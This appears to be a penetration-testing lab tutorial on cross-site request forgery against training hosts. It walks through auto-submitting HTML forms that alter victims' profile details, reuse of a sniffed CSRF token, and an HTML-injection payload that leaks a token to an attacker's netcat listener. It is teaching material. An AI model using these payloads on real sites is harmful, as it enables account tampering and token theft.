# Cross-Site Request Forgery (CSRF or XSRF)
## A web application is vulnerable to CSRF attacks when:
1. All the parameters required for the targeted request can be determined or guessed by the attacker
2. The application's session management is solely based on HTTP cookies, which are automatically included in browser requests
## To successfully exploit a CSRF vulnerability, we need
1. To craft a malicious web page that will issue a valid (cross-site) request impersonating the victim
2. The victim to be logged into the application at the time when the malicious cross-site request is issued
In your web application penetration testing or bug bounty hunting endeavors, you will notice a lot of applications that feature no anti-CSRF protections or anti-CSRF protections that can be easily bypassed.
## Cross-Site Request Forgery Example
Activate burp suite's proxy (Intercept On) and configure your browser to go through it.
We notice no anti-CSRF token in the update-profile request. Let's try executing a CSRF attack against our account (Ela Stienen) that will change her profile details by simply visiting another website (while logged in to the target application).
First, create and serve the below HTML page. Save it as notmalicious.html
```
<html>
  <body>
    <form id="submitMe" action="http://xss.htb.net/api/update-profile" method="POST">
      <input type="hidden" name="email" value="attacker@htb.net" />
      <input type="hidden" name="telephone" value="&#40;227&#41;&#45;750&#45;8112" />
      <input type="hidden" name="country" value="CSRF_POC" />
      <input type="submit" value="Submit request" />
    </form>
    <script>
      document.getElementById("submitMe").submit()
    </script>
  </body>
</html>
```
We can serve the page above from our attacking machine as follows.
```
python -m http.server 1337
```
While still logged in as Ela Stienen, open a new tab and visit the page you are serving from your attacking machine http://<VPN/TUN Adapter IP>:1337/notmalicious.html. You will notice that Ela Stienen's profile details will change to the ones we specified in the HTML page we are serving.

# Cross-Site Request Forgery (GET-based)
You should see the below.
The CSRF token is included in the GET request.
Let us simulate an attacker on the local network that sniffed the abovementioned request and wants to deface Julie Rogers' profile through a CSRF attack. Of course, they could have just performed a session hijacking attack using the sniffed session cookie.
First, create and serve the below HTML page. Save it as notmalicious_get.html
```
<html>
  <body>
    <form id="submitMe" action="http://csrf.htb.net/app/save/julie.rogers@example.com" method="GET">
      <input type="hidden" name="email" value="attacker@htb.net" />
      <input type="hidden" name="telephone" value="&#40;227&#41;&#45;750&#45;8112" />
      <input type="hidden" name="country" value="CSRF_POC" />
      <input type="hidden" name="action" value="save" />
      <input type="hidden" name="csrf" value="30e7912d04c957022a6d3072be8ef67e52eda8f2" />
      <input type="submit" value="Submit request" />
    </form>
    <script>
      document.getElementById("submitMe").submit()
    </script>
  </body>
</html>
```

Notice that the CSRF token's value above is the same as the CSRF token's value in the captured/"sniffed" request.
You can serve the page above from your attacking machine as follows.
```
python -m http.server 1337
```
While still logged in as Julie Rogers, open a new tab and visit the page you are serving from your attacking machine http://<VPN/TUN Adapter IP>:1337/notmalicious_get.html. You will notice that Julie Rogers' profile details will change to the ones we specified in the HTML page you are serving.
# Cross-Site Request Forgery (POST-based)
After authenticating as a user, you'll notice that you can delete your account. Let us see how one could steal the user's CSRF-Token by exploiting an HTML Injection/XSS Vulnerability.
Click on the "Delete" button. You will get redirected to `/app/delete/<your-email>`
Notice that the email is reflected on the page. Let us try inputting some HTML into the email value, such as:
```
<h1>h1<u>underline<%2fu><%2fh1>
```
If you inspect the source (`Ctrl+U`), you will notice that our injection happens before a single quote. We can abuse this to leak the CSRF-Token.
Let us first instruct Netcat to listen on port 8000, as follows.
```
nc -lvnp 8000
```
Now we can get the CSRF token via sending the below payload to our victim.
```
<table%20background='%2f%2f<VPN/TUN Adapter IP>:PORT%2f
```
While still logged in as Julie Rogers, open a new tab and visit `http://csrf.htb.net/app/delete/<table background='%2f%2f<VPN/TUN Adapter IP>:8000%2f`. You will notice a connection being made that leaks the CSRF token.
We remind you that this attack does not require the attacker to reside in the local network. HTML Injection is used to leak the victim's CSRF token remotely!